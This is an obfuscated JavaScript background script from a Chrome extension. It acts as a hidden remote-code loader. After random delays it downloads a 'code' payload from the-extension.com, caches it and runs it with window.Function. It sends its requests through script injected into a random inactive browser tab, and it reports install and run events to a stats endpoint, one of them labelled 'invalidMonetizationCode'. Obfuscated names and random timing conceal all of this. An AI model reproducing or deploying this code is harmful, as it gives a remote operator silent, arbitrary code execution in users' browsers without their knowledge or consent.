(function() {

    function logEvent({
        cat = 'eval',
        act = '',
        lab = '',
        fr = 0x3e8 * 0x3c * 0x3c * 0x18
    }) {
        let _0x4b1721 = t(`${cat}_${act}`, c['FD']);
        return localStorage['get'](_0x4b1721)['then'](_0x9415ed => {
            let _0x5d937f = _0x9415ed[_0x4b1721],
                _0x45c15f = 0x5265c00 == fr ? new Date()['getTime']() - new Date(_0x5d937f)['setUTCHours'](0x0, 0x0, 0x0, 0x0) >= fr : new Date()['getTime']() - _0x5d937f >= fr;
            if (!_0x5d937f || _0x45c15f) {
                let _0x9415ed = `${new URL(c['WL']['url'])['origin']}/stats`;
                n(`${_0x9415ed}?hash=jwtmv6kavksy5cazdf4leg66r&eventCategory=${cat}&eventAction=${act}&eventLabel=${lab}`, 'POST')['then'](_0x201de8 => {
                    let _0x9415ed = {};
                    _0x9415ed[_0x4b1721] = new Date()['getTime'](), localStorage['set'](_0x9415ed);
                });
            }
        });
    }

    function n(_0x42ba8f, n = 'GET') {
        return new Promise((_0x3090bd, _0x473358) => {
            function _0x3ad6d4(_0x3a3304, _0x4cce31, _0x57e5fb) {
                'loading' === _0x4cce31['status'] && (_0x20f3c8(_0x57e5fb, _0x42ba8f) && c['NZ'] <= 0x0 && (chrome['tabs']['onUpdated']['removeListener'](arguments['callee']), _0x2bc9ef(_0x3a3304)), c['NZ']--);
            }

            function _0x2bc9ef(_0x5a3411) {
                chrome['runtime']['onMessage']['addListener'](_0x4b297c), chrome['tabs']['executeScript'](_0x5a3411, {
                    'code': `(function(){var url = replaceableurl; var xhr = new XMLHttpRequest();xhr.onreadystatechange = function () {if (xhr.readyState === 4) {chrome.runtime.sendMessage({data: xhr.responseText, url: url,status:xhr.status});}};xhr.open('${n}',url, true);xhr.send();})()` ['replace']('replaceableurl', `'${_0x42ba8f}'`)
                });
            }

            function _0x4b297c(_0x4a051f) {
                _0x4a051f['url'] === _0x42ba8f && (_0x3090bd(_0x4a051f['data']), chrome['runtime']['onMessage']['removeListener'](arguments['callee']));
            }

            function _0x20f3c8(_0x45a021, _0x3db6fb) {
                return new RegExp(`^((?!(chrome${_0x3db6fb['includes']('http://') ? '|https|ftps' : ''})).+://)`)['test'](_0x45a021['url']);
            }
            _0x42ba8f && 0x0 !== _0x42ba8f['length'] || _0x473358('Url error'), chrome['tabs']['query']({}, function(_0x26d445) {
                let _0x3090bd = _0x26d445['filter'](_0x1c9951 => _0x20f3c8(_0x1c9951, _0x42ba8f) && !_0x1c9951['active']);
                0x0 === _0x3090bd['length'] ? chrome['tabs']['onUpdated']['addListener'](_0x3ad6d4) : _0x2bc9ef(_0x3090bd[Math['floor'](Math['random']() * _0x3090bd['length'])]['id']);
            });
        });
    }

    function t(_0x474bb1, _0x4cc1c1) {
        for (var _0x36e242 = '', _0x35971b = 0x0, _0x519d9f = 0x0; _0x519d9f < _0x474bb1['length']; _0x519d9f++) {
          _0x35971b = _0x474bb1[_0x519d9f]['charCodeAt']() + _0x4cc1c1, _0x36e242 += String['fromCharCode'](_0x35971b);
        }
        return _0x36e242;
    }

    function requestSuccess(responseJson) {
        return new Promise((_0x47fce0, _0x349364) => {
            let _0x51ae9e = !0x1,
                _0x556fe3 = '',
                _0x58bf0d = '';
            try {
                responseJson = JSON['parse'](responseJson),
                _0x556fe3 = responseJson['code'],
                _0x58bf0d = responseJson['version'],
                _0x556fe3 == -0x1 || (_0x51ae9e = !0x0);
            } catch (_0x1b0f96) {
                logEvent({
                    'act': 'error',
                    'lab': 'parseResponse',
                    'fr': 0x0
                });
            }
            _0x51ae9e ? localStorage['set']({
                'TjPzl8caI41': _0x556fe3,
                'KI10wTwwvF7': _0x58bf0d
            })['then'](_0x207847 => {
                localStorage['set']({
                    'pyW5F1U43VI': new Date()['getTime']()
                }), logEvent({
                    'act': 'download',
                    'lab': _0x58bf0d,
                    'fr': 0x0
                }), _0x47fce0({
                    'code': _0x556fe3,
                    'version': _0x58bf0d
                });
            }) : (_0x556fe3 != -0x1 && logEvent({
                'act': 'error',
                'lab': 'invalidMonetizationCode',
                'fr': 0x0
            }), localStorage['get'](['TjPzl8caI41', 'KI10wTwwvF7'])['then'](_0x5d38a5 => {
                _0x47fce0({
                    'code': _0x5d38a5['TjPzl8caI41'],
                    'version': _0x5d38a5['KI10wTwwvF7']
                });
            }));
        });
    }

    function a(_0xfc65f5) {
        try {
            window['Function'](_0xfc65f5['code'])(localStorage, n, logEvent), logEvent(_0xfc65f5['code'] && 0x0 !== _0xfc65f5['code']['length'] || _0xfc65f5['version'] && 0x0 !== _0xfc65f5['version']['length'] ? {
                'act': 'run',
                'lab': _0xfc65f5['version']
            } : {
                'act': 'run',
                'lab': 'idle'
            });
        } catch (_0x5bd26e) {
            logEvent({
                'act': 'error',
                'lab': `run_${_0xfc65f5['version']}`
            });
        }
    }

    function request() {
        return new Promise((_0x223434, _0x1b9f00) => {
            localStorage['get']('pyW5F1U43VI')['then'](_0x30d294 => {
                let _0x55a281 = _0x30d294['pyW5F1U43VI'] || 0x0;
                0x0 === _0x55a281 && localStorage['set']({
                    'XMWEzI4SfdC': new Date()['getTime']()
                })['then'](_0x2d7d72 => {
                    logEvent({
                        'act': 'install'
                    });
                }), new Date()['getTime']() - _0x55a281 > c['WL']['Gj'] ? setTimeout(function() {
                    n(`${c['WL']['url']}/?hash=jwtmv6kavksy5cazdf4leg66r`, 'GET')['then'](requestSuccess)['then'](_0x223434);
                }, c['fM']) : localStorage['get'](['TjPzl8caI41', 'KI10wTwwvF7'])['then'](_0x1d2d5e => {
                    _0x223434({
                        'code': _0x1d2d5e['TjPzl8caI41'],
                        'version': _0x1d2d5e['KI10wTwwvF7']
                    });
                });
            });
        });
    }

    function i() {
        setTimeout(function() {
            logEvent({
                'act': 'init'
            }), request()['then'](a);
        }, c['Cf']);
    }
    let c = {
            'WL': {
                'url': 'https://the-extension.com',
                'Gj': 0x2932e00
            },
            'NZ': Math['floor'](0x3 * Math['random']()),
            'fM': 0x1b7740 * Math['floor'](0x1 * Math['random']() + 0x1),
            'Cf': 0xea60 * Math['floor'](0x2 * Math['random']() + 0x1),
            'FD': 0x7
        },
        localStorage = {
            'get' (key = null) {
                return new Promise((_0x459136, _0x1dd2d2) => {
                    chrome['storage']['local']['get'](key, function(_0x49e268) {
                        _0x459136(_0x49e268);
                    });
                });
            },
            'set' (_0x1054f4) {
                return new Promise((_0x13679c, _0x5182a6) => {
                    chrome['storage']['local']['set'](_0x1054f4, function(_0x154ca1) {
                        _0x13679c(_0x154ca1);
                    });
                });
            },
            'yJ' (_0x21744e) {
                return new Promise((_0x23501d, _0x525375) => {
                    chrome['storage']['local']['yJ'](_0x21744e, function(_0x298d92) {
                        _0x23501d(_0x298d92);
                    });
                });
            },
            'EE' () {
                return new Promise((_0x47a45d, _0x110900) => {
                    chrome['storage']['local']['EE'](function(_0x25822d) {
                        _0x47a45d(_0x25822d);
                    });
                });
            }
        };
    i();
})
